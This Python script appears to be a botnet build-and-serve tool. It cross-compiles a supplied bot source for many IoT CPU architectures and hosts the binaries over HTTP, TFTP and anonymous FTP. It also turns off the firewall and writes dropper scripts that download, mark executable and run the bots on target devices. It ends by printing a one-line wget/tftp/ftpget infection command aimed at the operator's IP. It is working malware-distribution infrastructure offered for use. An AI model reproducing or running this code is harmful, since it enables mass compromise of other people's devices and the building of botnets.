import subprocess, sys

print('\x1b[31m###############################################################################')
print('\x1b[31m* ___     __________  ____ _______      _____ _______________.___.  ___       *')
print('\x1b[31m* / _ \_/\ \______   \/_   |\      \    /  _  \\______   \__  |   | / _ \_/\  *')
print('\x1b[31m* \/ \___/  |    |  _/ |   |/   |   \  /  /_\  \|       _//   |   | \/ \___/  *')
print('\x1b[31m*           |    |   \ |   /    |    \/    |    \    |   \\____   |           *')
print('\x1b[31m*           |______  / |___\____|__  /\____|__  /____|_  // ______|           *')
print('\x1b[31m*                  \/              \/         \/       \/ \/                  *')
print('\x1b[31m###############################################################################')
print('\x1b[31mNSA-edited.py | BUILD DATE: 7-7-16\r\n')
print('\x1b[31mUsage: python NSA-edited.py [BOTNAME.c] [IP ADDRESS] DONT BE A DUMBASS AND RUN IT OTHERWISE')

if len(sys.argv[2]) != 0:
    ip = sys.argv[2]
else:
    print("\x1b[0;31mIncorrect Usage!")
    print("\x1b[0;32mUsage: python " + sys.argv[0] + " <BOTNAME.C> <IPADDR> \x1b[0m")
    exit(1)

bot = sys.argv[1]

yourafag = raw_input("Get arch's? Y/n:")
if yourafag.lower() == "y":
    get_arch = True
else:
    get_arch = False
depends = raw_input("Install Dependencies? Y/n:")
if depends.lower() == "y":
	install_depends = True
else:
	install_depends = False
if install_depends == True:
	print('Installing Dependencies')
	run('yum install perl -y')
	run('yum install gcc -y')
	run('yum install gcc-c++ -y')
	run('yum install cpan -y')
	run('yum install httpd -y')
	run('yum install tftp -y')
	run('yum install screen -y')
	run('yum install nano -y')
	run('yum install unzip -y')
	run('yum install tar -y')
	run('yum install wget -y')
	run('yum install curl -y')
	run('yum install busybox -y')
	run('yum install python-paramiko -y')


	
botnames = [
	"jackmymips", #mips
    "jackmymipsel", #mipsel
    "jackmysh4", #sh4
    "jackmyx86", #x86
    "jackmyarmv6", #Armv6l
    "jackmyi686", #i686
    "jackmypowerpc", #ppc
    "jackmyi586", #i586
    "jackmym86k", #m68k
    "jackmysparc", #sparc
    "jackmyarmv4", #armv4l
	"jackmyarmv5", #armv5l
	"jackmypowerpc440" #ppc440fp
			]

getarch = [
'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mips.tar.bz2',
'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mipsel.tar.bz2',
'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sh4.tar.bz2',
'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-x86_64.tar.bz2',
'http://distro.ibiblio.org/slitaz/sources/packages/c/cross-compiler-armv6l.tar.bz2',
'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i686.tar.bz2',
'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-powerpc.tar.bz2',
'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i586.tar.bz2',
'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-m68k.tar.bz2',
'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sparc.tar.bz2',
'https://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv4l.tar.bz2',
'https://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv5l.tar.bz2',
'https://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-powerpc-440fp.tar.bz2'
		]

ccs = [
	"cross-compiler-mips",
	"cross-compiler-mipsel",
	"cross-compiler-sh4",
	"cross-compiler-x86_64",
	"cross-compiler-armv6l",
	"cross-compiler-i686",
    "cross-compiler-powerpc",
    "cross-compiler-i586",
    "cross-compiler-m68k",
    "cross-compiler-sparc",
    "cross-compiler-armv4l",
    "cross-compiler-armv5l",
    "cross-compiler-powerpc-440fp"
	]

def run(cmd):
    subprocess.call(cmd, shell=True)

run("rm -rf /var/www/html/* /var/lib/tftpboot/* /var/ftp/*")

if get_arch == True:
    run("rm -rf cross-compiler-*")

    print("Downloading Architectures")

    for arch in getarch:
        run("wget " + arch + " --no-check-certificate >> /dev/null")
        run("tar -xvf *tar.bz2")
        run("rm -rf *tar.bz2")

    print("Cross Compilers Downloaded...")

num = 0
for cc in ccs:
    arch = cc.split("-")[2]
    run("./"+cc+"/bin/"+arch+"-gcc -static -pthread -D" + arch.upper() + " -o " + botnames[num] + " " + bot + " > /dev/null")
    num += 1

print("Cross Compiling Done!")
print("Setting up your httpd and tftp")

run("yum install httpd -y")
run("service httpd start")
run("yum install xinetd tftp tftp-server -y")
run("yum install vsftpd -y")
run("service vsftpd start")

run('''echo -e "# default: off
# description: The tftp server serves files using the trivial file transfer \
#       protocol.  The tftp protocol is often used to boot diskless \
#       workstations, download configuration files to network-aware printers, \
#       and to start the installation process for some operating systems.
service tftp
{
        socket_type             = dgram
        protocol                = udp
        wait                    = yes
        user                    = root
        server                  = /usr/sbin/in.tftpd
        server_args             = -s -c /var/lib/tftpboot
        disable                 = no
        per_source              = 11
        cps                     = 100 2
        flags                   = IPv4
}
" > /etc/xinetd.d/tftp''')
run("service xinetd start")

run('''echo -e "listen=YES
local_enable=NO
anonymous_enable=YES
write_enable=NO
anon_root=/var/ftp
anon_max_rate=2048000
xferlog_enable=YES
listen_address='''+ ip +'''
listen_port=21" > /etc/vsftpd/vsftpd-anon.conf''')
run("service vsftpd restart")

for i in botnames:
    run("cp " + i + " /var/www/html")
    run("cp " + i + " /var/ftp")
    run("mv " + i + " /var/lib/tftpboot")

run('echo -e "#!/bin/bash" > /var/lib/tftpboot/tftp1.sh')
run('echo -e "ulimit -n 1024" >> /var/lib/tftpboot/tftp1.sh')
run('echo -e "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/tftp1.sh')

run('echo -e "#!/bin/bash" > /var/lib/tftpboot/tftp2.sh')
run('echo -e "ulimit -n 1024" >> /var/lib/tftpboot/tftp2.sh')
run('echo -e "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/tftp2.sh')

run('echo -e "#!/bin/bash" > /var/www/html/gtop.sh')

for i in botnames:
    run('echo -e "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://' + ip + '/' + i + '; chmod +x ' + i + '; ./' + i + '; rm -rf ' + i + '" >> /var/www/html/gtop.sh')
    run('echo -e "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 ' + ip + ' ' + i + ' ' + i + '; chmod 777 ' + i + ' ./' + i + '; rm -rf ' + i + '" >> /var/ftp/ftp1.sh')
    run('echo -e "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp ' + ip + ' -c get ' + i + ';cat ' + i + ' >badbox;chmod +x *;./badbox" >> /var/lib/tftpboot/tftp1.sh')
    run('echo -e "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r ' + i + ' -g ' + ip + ';cat ' + i + ' >badbox;chmod +x *;./badbox" >> /var/lib/tftpboot/tftp2.sh')

print('Stoping Iptables')
run("service iptables stop")
run("chkconfig iptables off")
print('Restarting Xinetd')
run("service xinetd restart")
print('Restarting Httpd')
run("service httpd restart")

print('Changing The Ulimit')
run('ulimit -Hn 999999; ulimit -Sn 99999')
run('ulimit -u 999999;ulimit -n 999999')
run('sysctl -w fs.file-max=999999 >/dev/null')
run('echo -e "ulimit -u 999999">> ~/.bashrc')
run('echo -e "ulimit -n 99999" >> ~/.bashrc')

print("\x1b[37mRecoded By ~B1NARY\x1b[0m")
print("\x1b[37mSkype: b1narythag0d | XMPP: b1nary@darkness.su")
print("\x1b[32mYour link: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://" + ip + "/gtop.sh; chmod 777 gtop.sh; sh gtop.sh; tftp " + ip + " -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g " + ip + "; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 " + ip + " ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf gtop.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *")